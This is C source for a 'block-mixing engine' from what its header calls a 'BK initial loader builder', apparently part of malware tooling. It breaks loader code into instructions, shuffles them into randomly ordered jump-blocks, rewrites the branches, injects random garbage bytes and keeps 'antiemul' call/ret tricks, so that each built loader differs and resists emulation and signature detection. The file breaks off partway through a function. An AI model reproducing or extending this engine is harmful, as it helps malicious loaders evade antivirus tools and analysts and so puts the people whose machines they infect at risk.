//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// BK initial loader builder. Version 2.9.2
//	
// module: bme.c
// $Revision: 39 $
// $Date: 2012-05-02 15:38:09 +0400 (Ср, 02 май 2012) $
// description: 
//	Block-mixing engine implementation.

#include "main.h"
#include "bme.h"
#include "instance.h"


//---- Predefinitions -----------------------------------------------------------------------------------------------------

extern ULONG __stdcall GetInstructionLen(const PCHAR buf);
ULONG	g_BmeFlags = 0;

extern	CODE_BLOCK	g_code_blocks;




// ---- Growing buffer -------------------------------------------------------------------------------------------------------
BOOL GbAlloc(
			PGROW_BUFFER	Grow, 
			ULONG			Size
			)
{
	BOOL Ret = FALSE;

	if (Grow->Buffer = (PCHAR)Alloc(Size))
	{
		Grow->End = Grow->Buffer + Size;
		Grow->Pos = Grow->Buffer;
		Grow->Increment = Size;
		Grow->Size = Size;
		Ret = TRUE;
	}
	return(Ret);
}

VOID GbFree(
		PGROW_BUFFER	Grow
		)
{
	ASSERT(Grow->Buffer);
	ASSERT(Grow->End > Grow->Buffer);
	ASSERT(Grow->Pos < Grow->End && Grow->Pos >= Grow->Buffer);

	Free(Grow->Buffer);
#if DEBUG
	Grow->Pos = 0;
	Grow->Size = 0;
	Grow->End = 0;
#endif
}

BOOL GbCheckResize(
		   PGROW_BUFFER	Grow,
		   ULONG		Addon
		   )
{
	BOOL Ret = FALSE;
	ULONG	Increment = 0;
	ULONG	Offset = 0;

	ASSERT(Grow->Buffer);
	ASSERT(Grow->End > Grow->Buffer);
	ASSERT(Grow->Pos < Grow->End && Grow->Pos >= Grow->Buffer);

	if ((Grow->Pos + Addon) < Grow->End)
		return(TRUE);

	while (Increment < Addon)
		Increment += Grow->Increment;
	Increment += Grow->Size;

	Offset = (ULONG)(Grow->Pos - Grow->Buffer);
	if (Grow->Buffer = (PCHAR)Realloc(Grow->Buffer, Increment))
	{
		Grow->Pos = Grow->Buffer + Offset;
		Grow->Size = Increment;
		Grow->End = Grow->Buffer + Increment;
		Ret = TRUE;
	}
	return(Ret);
}

VOID GbAppend(
		PGROW_BUFFER	Grow,
		PVOID			Buffer,
		ULONG			Size
		)
{
	ASSERT(Grow->Buffer);
	ASSERT(Grow->End > Grow->Buffer);
	ASSERT(Grow->Pos < Grow->End && Grow->Pos >= Grow->Buffer);

	if (Size)
	{
		memcpy(Grow->Pos, (PCHAR)Buffer, Size);
		Grow->Pos += Size;
	}

	ASSERT(Grow->Pos < Grow->End && Grow->Pos >= Grow->Buffer);
}



/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Fills the char array of MapSize bytes with random numbers starting from MapIndex.
//
static VOID GenerateBlockMap(
		  PUCHAR	IndexMap,	// memory buffer for map
		  ULONG		MapIndex,	// lowest index in map, should be >0	
		  ULONG		MapSize		// size of the buffer in bytes
		  )
{
	ULONG i = 0;

	ASSERT(MapSize < MAX_BLOCKS);
	ASSERT(MapIndex > 0);
	
	memset(IndexMap, 0, MapSize);

	while (i<MapSize)
	{
		ULONG Index = (rand() % MapSize);
		if (IndexMap[Index] == 0)
		{
			IndexMap[Index] = (UCHAR)(i + MapIndex);
			i+=1;
		}
	}
	
}


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Releases the specified block descriptor, previously allocated by AllocateBlock function.
//
static VOID ReleaseBlock(
			PBLOCK_DESCRIPTOR BlockDesc
			)
{

	ASSERT(IsListEmpty(&BlockDesc->ConstListHead));

	BlockDesc->Binary = (PCHAR)&BlockDesc->Data;
	BlockDesc->Size = 0;

	BlockDesc->Index = MAX_BLOCKS;
	BlockDesc->Entry = 0;
} 

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Allcoates and initializes new block descriptor.
//
static PBLOCK_DESCRIPTOR AllocateBlock(VOID)
{
	PBLOCK_DESCRIPTOR	BlockDesc = (PBLOCK_DESCRIPTOR)Alloc(sizeof(BLOCK_DESCRIPTOR));
	if (BlockDesc)
	{
		memset(BlockDesc, 0, sizeof(BLOCK_DESCRIPTOR));
		InitializeListHead(&BlockDesc->ConstListHead);
		InitializeListHead(&BlockDesc->InstrListHead);
		InitializeListHead(&BlockDesc->JmpBlockListHead);
		InitializeListHead(&BlockDesc->CRefListHead);

		BlockDesc->Binary = (PCHAR)&BlockDesc->Data;
	}

	return(BlockDesc);
}



static VOID	FreeBlock(PBLOCK_DESCRIPTOR	BlockDesc)
{
	ASSERT(IsListEmpty(&BlockDesc->ConstListHead));
	ASSERT(IsListEmpty(&BlockDesc->CRefListHead));
	ASSERT(IsListEmpty(&BlockDesc->InstrListHead));
	ASSERT(IsListEmpty(&BlockDesc->JmpBlockListHead));

	Free(BlockDesc);
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Checks if the specified "call block" instruction should be ignored for the specified block.
//	If so, - removes the instruction.
//
static BOOL CheckIgnoreBlock(PBLOCK_DESCRIPTOR	BlockDesc, PCHAR Instruction)
{
	BOOL Ret = FALSE;
	PCODE_BLOCK	DestBlock;
	UCHAR BlockIndex = *(PUCHAR)(Instruction + 2);

	ASSERT(BlockIndex <= MAX_BLOCKS);
	DestBlock = &BlockDesc->BlockTable[BlockIndex];
	ASSERT(DestBlock->Offset);
	ASSERT(DestBlock->Size);

	if (BlockDesc->Flags & DestBlock->Flags & BF_TYPE_MASK)
	{
		// Block of this type should be ignored.
		Ret = TRUE;
	}
	
	return(Ret);
}

static PINSTRUCTION AllocInstruction(VOID)
{
	PINSTRUCTION Instr = (PINSTRUCTION)Alloc(sizeof(INSTRUCTION));
	if (Instr)
	{
		memset(Instr, 0, sizeof(INSTRUCTION));
		InitializeListHead(&Instr->Entry);
		Instr->Magic = INSTRUCTION_MAGIC;
	}
	return(Instr);
}

static VOID ReleaseInstruction(PINSTRUCTION Instr)
{
	ASSERT_INSTRUCTION(Instr);
	Free(Instr);
}


static PJMP_BLOCK	AllocateJmpBlock(VOID)
{
	PJMP_BLOCK JmpBlock = (PJMP_BLOCK)Alloc(sizeof(JMP_BLOCK));
	if (JmpBlock)
	{
		memset(JmpBlock, 0, sizeof(JMP_BLOCK));
		InitializeListHead(&JmpBlock->Entry);
		InitializeListHead(&JmpBlock->InstrListHead);
	}
	return(JmpBlock);
}

static VOID ReleaseJmpBlock(PJMP_BLOCK	JmpBlock)
{
	Free(JmpBlock);
}


static ULONG GetRefOffset(ULONG Offset, ULONG Size, LONG Delta)
{
	LONG RefOffs = (LONG)(Offset+Size);

//	ASSERT(Delta != 0);

	RefOffs += Delta;
	return(RefOffs);
}

#define		IsCode16()	(BlockDesc->Flags & BF_CODE16)


static	ULONG	Code16Size(PCHAR Instruction, ULONG Size)
{

	UCHAR	Prefix = 0;
	USHORT	OpWord;				// two bytes opcode
	UCHAR	OpByte0, OpByte1;	// one byte opcode

	Prefix = *(UCHAR*)(Instruction);
	if (Prefix == 0x26)
	{
		Instruction += 1;
		Size -= 1;
	}
	else
		Prefix = 0;

	OpWord = *(USHORT*)(Instruction);	
	OpByte0 = *(UCHAR*)(Instruction);
	OpByte1 = *(UCHAR*)(Instruction + 1);


	switch(OpWord)
	{
	case OP_MOV_AX_WORD_PTR:
		Size = 2;
		break;
	case OP_MOV_BYTE_PTR_16:
		Size = 5;
		break;
	case OP_MOV_WORD_PTR_16:
		Size = 6;
		break;
	default:
		if (Size > 4)
		{
			if (OpByte0 == ADDRESS_SIZE_PREFIX)
			{
				//__debugbreak();
			}
			else		
				Size -= 2;
		}
		break;
	}

	do 
	{
		if ((OpWord & OP_PUSH_WORD_PTR) == OP_PUSH_WORD_PTR)
		{
			if (Size > 3)
				Size = 3;
			break;
		}

		if ((OpWord & OP_MOV_REG_WORD_PTR) == OP_MOV_REG_WORD_PTR)
		{
			if (Size > 3)
				Size = 3;
			break;
		}

		if ((OpByte0 == OP_MOV_PTR_REG || OpByte0 == OP_MOV_REG_PTR)  && OpByte1 < 0x40)
		{
			Size = 2;
			break;
		}

	} while (FALSE);


	if (Prefix)
		Size += 1;

	return(Size);
	
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Splists specified code block to a list of instructions. 
//
static VOID SplitInstructions(PBLOCK_DESCRIPTOR	BlockDesc)
{
	ULONG	i, iSize;
	ULONG	cSize = 0;	// Real block size in bytes
	ULONG	vSize = 0;	// Virtual block size in bytes. Calculated by all instruction sizes, including changed and removed.
	PINSTRUCTION	Instr = NULL;
	BlockDesc->InstructionCount = 0;
	BlockDesc->FirstBranch = 0;

	ASSERT(BlockDesc->sSize);

	// Enumerating instructions
	while (cSize < BlockDesc->sSize)
	{
		PCHAR	Instruction = BlockDesc->Binary + cSize;
		UCHAR	OpByte = *(UCHAR*)(Instruction);		// one byte opcode
		USHORT	OpWord = *(USHORT*)(Instruction);		// two bytes opcode
		if (Instr = AllocInstruction())
		{
			Instr->Offset = cSize;
			Instr->vOffset = vSize;
			Instr->Reference = INVALID_OFFSET;
			iSize = GetInstructionLen(Instruction);

			ASSERT(iSize <= MAX_INSTRUCTION_LEN);
			ASSERT(cSize < MAX_BLOCK_SIZE);

			if (IsCode16() && (iSize > 2))
				iSize = Code16Size(Instruction, iSize);

			// Checking instruction size
			switch (iSize)
			{
			case 3:
				if (!IsCode16())
					break;
			case 5:
				if ((*(PULONG)(Instruction + 1) & COMMON_CHECK_MASK) == CONST_INDEX_CHECK)
				{
					// any 5-bytes mov, push, add or sub instruction that operates with constant value.
					Instr->Type = INSTR_CONST_ACCESS;
					Instr->OpcodeLen = 1;
					break;
				}

				if ((*(PULONG)(Instruction + 1) & (~IMPORT_INDEX_MASK)) == IMPORT_INDEX_CHECK)
				{
					// any 5-bytes mov, push, add or sub instruction that operates with IAT entry address.
					Instr->Type = INSTR_IMPORT_ACCESS;
					Instr->OpcodeLen = 1;
					break;
				}

				if (OpByte == OPCODE_JMP_NEAR || OpByte == OPCODE_CALL_NEAR)
				{
					// any 5-bytes call or jump
					Instr->Type = INSTR_BRANCH_NEAR;
					Instr->OpcodeLen = 1;
					Instr->Reference = GetRefOffset(Instr->Offset, iSize, *(PUSHORT)(Instruction+1));
					BlockDesc->BranchCount += 1;
					if (BlockDesc->FirstBranch == 0)
						BlockDesc->FirstBranch = BlockDesc->InstructionCount;

					if (*(PUCHAR)(Instruction + iSize) == OP_RET_NEAR)
					{
						// call XXX/ret - antiemul instruction
						Instr->BranchLen = (UCHAR)iSize;
						iSize += 1;
					}
				}
				break;
			case 6:
				//if (OpWord == OP_CALL_FAR)
				if ((*(PULONG)(Instruction + 2) & (~IMPORT_INDEX_MASK)) == IMPORT_INDEX_CHECK)
				{
					// 6-bytes "call dword ptr []" instruction or any 6-bytes mov, push or pop instruction that operates 
					//  with an IAT entry address.
					Instr->Type = INSTR_IMPORT_CALL;
					Instr->OpcodeLen = 2;
				}
				break;
			case 2:
				if (OpWord == OP_CALL_EBP)
				{
					// call ebp instruction. Call block.
					// Check out if this call should be ignored for any reason.
					if (CheckIgnoreBlock(BlockDesc, Instruction))
					{
						// Ignoring block
						Instr->OpcodeLen = 1;
						Instr->Flags = IF_NOCOPY; 
						Instr->BranchLen = 1;
						Instr->TotalLen = 1;

						Instr->Data[0] = OP_NOP;
					}
					else
					{
						if (BlockDesc->Flags & BF_NO_EBP)
						{
							// Changing 'call ebp' instruction with near call
							Instr->Type = INSTR_CALL_BLOCK;
							Instr->OpcodeLen = 1;
							Instr->Flags = IF_NOCOPY; 
							Instr->Data[0] = OPCODE_CALL_NEAR;
							Instr->Data[1] = *(CHAR*)(Instruction+2);
							if (IsCode16())
								Instr->TotalLen = 3;
							else
								Instr->TotalLen = 5;
						}
						else
						{
							// Normal call ebp
							Instr->Type = INSTR_CALL_EBP;
							Instr->OpcodeLen = 2;
						
							if (*(PUCHAR)(Instruction + 3) == 0x90)
							// nop after call ebp, used not to break next instruction
								iSize += 1;
							
						}
					}
					iSize += 1;
					break;
				}	// if (OpWord == OP_CALL_EBP)

				if ((OpByte & 0xf0) == OP_JMP_COND || (OpByte & 0xf4) == OP_JMP_SHORT)
				{
					// jz, jnz, jmp short etc...
					Instr->Type = INSTR_JMP_SHORT;
					Instr->OpcodeLen = 1;
					Instr->Reference = GetRefOffset(Instr->Offset, 2, (LONG)*(CHAR*)(Instruction+1));
					BlockDesc->BranchCount += 1;
					if (BlockDesc->FirstBranch == 0)
						BlockDesc->FirstBranch = BlockDesc->InstructionCount;
				}
				break;
			case 1:
				if (OpByte == OP_ICEBP)
				{
					// generate garbage
					Instr->Type = INSTR_DB;
					Instr->Flags = IF_NOCOPY;

					i = (ULONG)*(UCHAR*)(Instruction+1);
					if (i & 0x80)
						i = (rand()%(i^0x80)) + 1;
					iSize = i;
					for (i=0; i<iSize; i++)
						Instr->Data[i] = (UCHAR)(rand()%0x100);
					Instr->OpcodeLen = (UCHAR)iSize;
					BlockDesc->Size = BlockDesc->Size + iSize - 2;
					break;
				}	// if (OpByte == OP_ICEBP)

				if (OpByte == OP_SALC)
				{
					// "MOV al, BlockIndex" instruction

					Instr->Type = INSTR_MOV_AL_INDEX;
					Instr->Flags = IF_NOCOPY;
					Instr->OpcodeLen = 1;
					iSize += 1;
					Instr->Data[0] = OP_MOV_CL_BYTE;
					Instr->Data[1] = HIBYTE(OpWord);
				}	// if (OpByte == OP_SALC)
				break;
			};

			ASSERT(iSize <= MAX_INSTRUCTION_LEN);

			if (Instr->TotalLen == 0)
				Instr->TotalLen = (UCHAR)iSize;

			if (Instr->BranchLen == 0)
				Instr->BranchLen = (UCHAR)iSize;

			if (!(Instr->Flags & IF_NOCOPY))
				memcpy(&Instr->Data, Instruction, iSize);


			cSize += iSize;
			vSize += Instr->TotalLen;

			InsertTailList(&BlockDesc->InstrListHead, &Instr->Entry);
			BlockDesc->InstructionCount += 1;
		}
	}

	BlockDesc->Size = vSize;
}


static PJMP_BLOCK CreateJump(
					ULONG	cOffset		// code offset of the block to jump 
					)
{
	PJMP_BLOCK		JmpBlock1 = NULL;
	PINSTRUCTION	Instr = NULL;

	do	// not a loop
	{

		if (!(JmpBlock1 = AllocateJmpBlock()))
			break;
		if (!(Instr = AllocInstruction()))
			break;

		Instr->Offset = INVALID_OFFSET;
		Instr->OpcodeLen = 1;
		Instr->Reference = cOffset;
		Instr->TotalLen = 2;
		Instr->BranchLen = 2;
		Instr->Type = INSTR_JMP_SHORT;
		Instr->Data[0] = OPCODE_JMP_SHORT;

		InsertTailList(&JmpBlock1->InstrListHead, &Instr->Entry);
		JmpBlock1->Count = 1;	// single jump instruction
		JmpBlock1->iOffset = INVALID_OFFSET;
		JmpBlock1->Size = Instr->TotalLen;

		return(JmpBlock1);

	} while(FALSE);

	if (Instr)
		ReleaseInstruction(Instr);
	if (JmpBlock1)
		ReleaseJmpBlock(JmpBlock1);

	return(NULL);
}

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Mixes jump-blocks
//
static VOID CreateJumpBlocks(
			PBLOCK_DESCRIPTOR	BlockDesc
			)
{
	LIST_ENTRY	JmpBlockList;
	PLIST_ENTRY	pEntry;
	ULONG rCount= 0, iCount = 0, bCount = 0, i, c, rOffset, cOffset = 0;
	PJMP_BLOCK	JmpBlock, JmpBlock1;
	PINSTRUCTION	Instr;
	PCHAR IndexMap;

	InitializeListHead(&JmpBlockList);
	pEntry = BlockDesc->InstrListHead.Flink;

	// Splitting code into few jump-blocks
	iCount = BlockDesc->InstructionCount;
	do {
/*
		// First jump-block of a block with BF_ENTRY_AT_BEGIN should contain a brunch instruction.
		if (bCount == 0 && (BlockDesc->Flags & BF_ENTRY_AT_BEGIN) && BlockDesc->FirstBranch)
		{
			rCount = BlockDesc->FirstBranch + 1;
			// This is first jump-block and it must be at begin
			if (rCount < JMP_BLOCK_MAX)
				rCount = (rand()%(JMP_BLOCK_MAX - rCount)) + rCount;
		}
		else
*/
			rCount = (rand()%(JMP_BLOCK_MAX - JMP_BLOCK_MIN)) + JMP_BLOCK_MIN;

		if (!(BlockDesc->Flags & BF_JUMPS))
			rCount = iCount;

		if (rCount > iCount) 
			rCount = iCount;

		iCount -= rCount;

		ASSERT(!IsListEmpty(&BlockDesc->InstrListHead));

		if (JmpBlock = AllocateJmpBlock())
		{
			Instr = CONTAINING_RECORD(pEntry, INSTRUCTION, Entry);

			ASSERT(Instr->Offset < MAX_BLOCK_SIZE);
			JmpBlock->iOffset = Instr->Offset;
			JmpBlock->vOffset = Instr->vOffset;
			bCount += 1;
		
			for (i=0; i<rCount; i++)
			{
				ASSERT(pEntry != &BlockDesc->InstrListHead);
				Instr = CONTAINING_RECORD(pEntry, INSTRUCTION, Entry);
				pEntry = pEntry->Flink;
				RemoveEntryList(&Instr->Entry);
				BlockDesc->InstructionCount -= 1;
				InitializeListHead(&Instr->Entry);
				InsertTailList(&JmpBlock->InstrListHead, &Instr->Entry);
				JmpBlock->Size += Instr->TotalLen;
				JmpBlock->Count += 1;
			}
			if (pEntry != &BlockDesc->InstrListHead)
			{
				Instr = CONTAINING_RECORD(pEntry, INSTRUCTION, Entry);
				JmpBlock->Next = Instr->Offset;
			}

			InsertTailList(&JmpBlockList, &JmpBlock->Entry);
		}
	} while(iCount);

	// Mixing jump blocks
	do	// not a loop
	{
		ULONG Next = 0;

		if (!(IndexMap = (PCHAR)Alloc(bCount)))
			break;
		
//		cOffset = 0;	// code offset
		rOffset = 0;	// real block offset

		if (BlockDesc->Flags & BF_ENTRY_AT_BEGIN)
		{
			IndexMap[0] = 1;
			GenerateBlockMap(IndexMap+1, 2, bCount-1);
		}
		else
			GenerateBlockMap(IndexMap, 1, bCount);

		for (i = 0; i<bCount; i++)
		{
			rCount = IndexMap[i];
			pEntry = JmpBlockList.Flink;
			for (c = 1; c<rCount; c++)
			{
				pEntry = pEntry->Flink;
				if (pEntry == &JmpBlockList)
					pEntry = pEntry->Flink;

			}

			ASSERT(pEntry != &JmpBlockList);
			JmpBlock = CONTAINING_RECORD(pEntry, JMP_BLOCK, Entry);
			if (Next != 0 && JmpBlock->iOffset != Next) // && cOffset < BlockDesc->Size)
			{
				// This is not the next block, inserting jump
				if (!(JmpBlock1 = CreateJump(Next)))
					break;
				JmpBlock1->rOffset = rOffset;
				InsertTailList(&BlockDesc->JmpBlockListHead, &JmpBlock1->Entry);
				rOffset += JmpBlock1->Size;
			}	// if (JmpBlock->Offset != cOffset)
			// Link block to the list
			RemoveEntryList(&JmpBlock->Entry);
			InitializeListHead(&JmpBlock->Entry);
			InsertTailList(&BlockDesc->JmpBlockListHead, &JmpBlock->Entry);
			JmpBlock->rOffset = rOffset;
//			cOffset = JmpBlock->iOffset + JmpBlock->Size;
			ASSERT(cOffset <= BlockDesc->Size);
			rOffset += JmpBlock->Size;
			Next = JmpBlock->Next;
	
		}	// for (i = 0; i<bCount; i++)

		if (Next)
		{
			// This is not the last block, instering jump to the last one
			if (!(JmpBlock1 = CreateJump(Next)))
				break;
			JmpBlock1->rOffset = rOffset;
			InsertTailList(&BlockDesc->JmpBlockListHead, &JmpBlock1->Entry);
			rOffset += JmpBlock1->Size;
		}
	} while(FALSE);

	if (IndexMap)
		Free(IndexMap);
}


ULONG JmpBlockFind(PLIST_ENTRY JmpBlockList, ULONG Offset)
{
	PLIST_ENTRY pEntry = JmpBlockList->Flink;
	PINSTRUCTION Instr = NULL;
	PJMP_BLOCK JmpBlock = NULL;
	ULONG	iOffset = INVALID_OFFSET;

	while((Instr == NULL) && pEntry != JmpBlockList)
	{
		JmpBlock = CONTAINING_RECORD(pEntry, JMP_BLOCK, Entry);
		if (JmpBlock->iOffset != INVALID_OFFSET && JmpBlock->iOffset <= Offset && (JmpBlock->iOffset + JmpBlock->Size) > Offset)
		{
			// Block containing offset found
			PLIST_ENTRY iEntry = JmpBlock->InstrListHead.Flink;
			while(iEntry != &JmpBlock->InstrListHead)
			{
				Instr = CONTAINING_RECORD(iEntry, INSTRUCTION, Entry);
				if (Instr->Offset == Offset)
					break;
				Instr = NULL;
				iEntry = iEntry->Flink;
			}
		}
		pEntry = pEntry->Flink;
	}

	ASSERT(Instr);
	ASSERT(JmpBlock);

	if (JmpBlock)
		iOffset = Instr->vOffset - JmpBlock->vOffset + JmpBlock->rOffset;

	return(iOffset);
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Rebuilds specified branch instruction to brunch to the specified offset
//
static BOOL RebuildBranch(
				  PINSTRUCTION	Instr,
				  LONG			bOffset
				  )
{
	BOOL Ret = TRUE;

	ASSERT(Instr->OpcodeLen == 1);

	switch(Instr->Type)
	{
	case INSTR_BRANCH_NEAR:
		*(PLONG)(&Instr->Data[Instr->OpcodeLen]) = bOffset;
		break;

	case INSTR_JMP_SHORT:
		if (bOffset < 128 && bOffset > -128)
			// branch instruction not changed, it stays SHORT
			Instr->Data[Instr->OpcodeLen] = (CHAR)bOffset;
		else
		{
			// changing SHORT branch instrunction to NEAR one (or more)
//			ASSERT(FALSE); // currently not supported
			Ret = FALSE;
		}
		break;

	default:
		ASSERT(FALSE);
	};

	return(Ret);
}


//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Processes list of jump-blocks linking instructions into single list
//
static BOOL ProcessJumpBlocks(
				PBLOCK_DESCRIPTOR	BlockDesc
			)
{
	ULONG	cOffset = 0;
	PLIST_ENTRY	iEntry, bEntry = BlockDesc->JmpBlockListHead.Flink;
	PJMP_BLOCK JmpBlock;
	PINSTRUCTION Instr;

	while(bEntry != &BlockDesc->JmpBlockListHead)
	{
		JmpBlock = CONTAINING_RECORD(bEntry, JMP_BLOCK, Entry);
		iEntry = JmpBlock->InstrListHead.Flink;
		while(iEntry != &JmpBlock->InstrListHead)
		{
			Instr = CONTAINING_RECORD(iEntry, INSTRUCTION, Entry);
			if (Instr->Reference != INVALID_OFFSET)
			{
				ULONG iOffset = JmpBlockFind(&BlockDesc->JmpBlockListHead, Instr->Reference);
				ULONG rOffset;

				if (JmpBlock->iOffset != INVALID_OFFSET)
					//rOffset = Instr->Offset - JmpBlock->iOffset + JmpBlock->rOffset;
					rOffset = Instr->vOffset - JmpBlock->vOffset + JmpBlock->rOffset;
				else
					rOffset = JmpBlock->rOffset;

				rOffset += Instr->BranchLen;
/*
#if _DEBUG
				// we do not recalculate short jumps into near ones
				if (rOffset > iOffset)
					ASSERT(rOffset-iOffset < 0x80);
				else
					ASSERT(iOffset-rOffset < 0x80);
#endif
*/

				rOffset = iOffset - rOffset;
				if (!RebuildBranch(Instr, (LONG)rOffset))
					return(FALSE);
			}
			iEntry = iEntry->Flink;
		}
		bEntry = bEntry->Flink;
	}

	return(TRUE);
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Converts multiple jump-blocks into a list of single instructions.
//
static VOID JmpBlockToInstrList(
			PBLOCK_DESCRIPTOR	BlockDesc
			)
{
	PLIST_ENTRY iEntry, pEntry = BlockDesc->JmpBlockListHead.Flink;

	ASSERT(IsListEmpty(&BlockDesc->InstrListHead));
	ASSERT(BlockDesc->InstructionCount == 0);

	while(pEntry != &BlockDesc->JmpBlockListHead)
	{
		PJMP_BLOCK	JmpBlock = CONTAINING_RECORD(pEntry, JMP_BLOCK, Entry);
		ULONG iOffset = JmpBlock->rOffset;

		if (JmpBlock->iOffset == 0)
			// The first block
			BlockDesc->Entry = iOffset;

		iEntry = JmpBlock->InstrListHead.Flink;
		while(iEntry != &JmpBlock->InstrListHead)
		{
			PINSTRUCTION Instr = CONTAINING_RECORD(iEntry, INSTRUCTION, Entry);
			ASSERT_INSTRUCTION(Instr);
			iEntry = iEntry->Flink;
			RemoveEntryList(&Instr->Entry);

			Instr->Offset = iOffset;
			iOffset += Instr->TotalLen;

			InsertTailList(&BlockDesc->InstrListHead, &Instr->Entry);
			JmpBlock->Count -= 1;
			BlockDesc->InstructionCount += 1;
		}

		ASSERT(JmpBlock->Count == 0);
		ASSERT(IsListEmpty(&JmpBlock->InstrListHead));

		pEntry = pEntry->Flink;
		RemoveEntryList(&JmpBlock->Entry);
		ReleaseJmpBlock(JmpBlock);
	}
	ASSERT(IsListEmpty(&BlockDesc->JmpBlockListHead));
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Rebuilds the code block from the instruction list.
//
static ULONG RebuildBlock(
		  PBLOCK_DESCRIPTOR	BlockDesc,	// code block descriptor
		  PCHAR	Buffer					// buffer to place code
		  )
{
	ULONG	Index, iCount = 0;
	PLIST_ENTRY pEntry = BlockDesc->InstrListHead.Flink;
	PCHAR sBuffer = Buffer;

	ASSERT(BlockDesc->InstructionCount != 0);
	ASSERT(!IsListEmpty(&BlockDesc->InstrListHead));

	while(pEntry != &BlockDesc->InstrListHead)
	{
		PINSTRUCTION Instr = CONTAINING_RECORD(pEntry, INSTRUCTION, Entry);
		ASSERT_INSTRUCTION(Instr);
		memcpy(Buffer, &Instr->Data, Instr->TotalLen);

		switch (Instr->Type)
		{
		case INSTR_CONST_ACCESS:
				// any 5-bytes mov, push, add or sub instruction that operates with constant value.
				ASSERT((Instr->TotalLen == 5 || Instr->TotalLen == 3) && Instr->OpcodeLen == 1);
				if (AllocateConstant(sBuffer, Buffer, &BlockDesc->ConstListHead, BlockDesc->Flags))
					BlockDesc->ConstCount += 1;
				break;
		case INSTR_IMPORT_ACCESS:
				// any 5-bytes mov, push, add or sub instruction that operates with IAT entry address.
				ASSERT(Instr->TotalLen == 5 && Instr->OpcodeLen == 1);
			break;
		case INSTR_IMPORT_CALL:
				// 6-bytes "call dword ptr []" instruction or any 6-bytes mov, push or pop instruction that operates 
				//  with an IAT entry address.
				ASSERT(Instr->TotalLen == 6 && Instr->OpcodeLen == 2);
				break;
		case INSTR_CALL_EBP:
				// call ebp instruction. Call block.
				// Check out if this call should be ignored for any reason.
				ASSERT(Instr->TotalLen >= 3 && Instr->OpcodeLen == 2);
				if (!CheckIgnoreBlock(BlockDesc, Buffer))
				{
					Index = (UCHAR)Instr->Data[2]; 
					Buffer[Instr->OpcodeLen] = (CHAR)(BlockDesc->RndIndexMap[Index] - 1);
				}
				break;
		case INSTR_CALL_BLOCK:
				// near call to a block
				ASSERT(BlockDesc->Flags & BF_NO_EBP);
				ASSERT(IsCode16() || (Instr->TotalLen == 5 && Instr->OpcodeLen == 1));
				Index = (UCHAR)Instr->Data[1]; 
				Buffer[Instr->OpcodeLen] = (CHAR)(BlockDesc->RndIndexMap[Index] - 1);
				if (AllocateCRef(sBuffer, Buffer, &BlockDesc->CRefListHead, BlockDesc->Flags))
					BlockDesc->CRefCount += 1;
				break;
		case INSTR_MOV_AL_INDEX:
				// MOV al,XX, where XX - block index
				Index = (UCHAR)Instr->Data[1]; 
				Buffer[Instr->OpcodeLen] = (CHAR)(BlockDesc->RndIndexMap[Index] - 1);
				break;
		};	// 	switch (Instr->Type)

		if (!(BlockDesc->Flags & BF_VIRTUAL))
			Buffer += Instr->TotalLen;
		pEntry = pEntry->Flink;
		RemoveEntryList(&Instr->Entry);
		iCount += 1;
		ReleaseInstruction(Instr);
	}

	ASSERT(iCount == BlockDesc->InstructionCount);
	ASSERT(IsListEmpty(&BlockDesc->InstrListHead));

	return((ULONG)(Buffer - sBuffer));
}


static VOID ResetJumpBlocks(
				PBLOCK_DESCRIPTOR	BlockDesc
				)
{
	PLIST_ENTRY iEntry, pEntry = BlockDesc->JmpBlockListHead.Flink;

	ASSERT(IsListEmpty(&BlockDesc->InstrListHead));
	ASSERT(BlockDesc->InstructionCount == 0);

	while(pEntry != &BlockDesc->JmpBlockListHead)
	{
		PJMP_BLOCK	JmpBlock = CONTAINING_RECORD(pEntry, JMP_BLOCK, Entry);
		ULONG iOffset = JmpBlock->rOffset;

		if (JmpBlock->iOffset == 0)
			// The first block
			BlockDesc->Entry = iOffset;

		iEntry = JmpBlock->InstrListHead.Flink;
		while(iEntry != &JmpBlock->InstrListHead)
		{
			PINSTRUCTION Instr = CONTAINING_RECORD(iEntry, INSTRUCTION, Entry);
			ASSERT_INSTRUCTION(Instr);
			iEntry = iEntry->Flink;
			RemoveEntryList(&Instr->Entry);

			ReleaseInstruction(Instr);
			JmpBlock->Count -= 1;
		}

		ASSERT(JmpBlock->Count == 0);
		ASSERT(IsListEmpty(&JmpBlock->InstrListHead));

		pEntry = pEntry->Flink;
		RemoveEntryList(&JmpBlock->Entry);
		ReleaseJmpBlock(JmpBlock);
	}
	ASSERT(IsListEmpty(&BlockDesc->JmpBlockListHead));
}

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Processes specified block, detects imports, branches, and internal calls.
//
static VOID ProcessBlock(
			PBLOCK_DESCRIPTOR	BlockDesc
			)
{
	BOOL Ret = TRUE;

	// Split whole code into instructions and link'em into a list
	do 
	{
		SplitInstructions(BlockDesc);
		if (!(BlockDesc->Flags & BF_VIRTUAL))
		{
			// Split instructions list into few jump-blocks. Mix jump-blocks in random order.
			CreateJumpBlocks(BlockDesc);
			// Recalculate cross-referencess.
			if (!(Ret = ProcessJumpBlocks(BlockDesc)))
			{
				ResetJumpBlocks(BlockDesc);
				continue;
			}
			// Convert blocks back to instruction list
			JmpBlockToInstrList(BlockDesc);
		}
	} while(!Ret);
	// Rebuild code block from the instruction list
	BlockDesc->Size = RebuildBlock(BlockDesc, BlockDesc->Binary);
	if (BlockDesc->Size & 1)
	{
		// Aligning block size at 2-bytes 
		BlockDesc->Binary[BlockDesc->Size] = rand()%0xff;
		BlockDesc->Size += 1;
	}
}


//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Allocates a buffer, morphes a block, enumerates all the block instances.
//
static BOOL GetMorphedBlock(
				PCODE_BLOCK			CodeBlock,		// the code block to morph
				PBLOCK_DESCRIPTOR	BlockDesc		// block descriptor tha receives all info about morphed block
				)
{
	BOOL	Ret = FALSE;
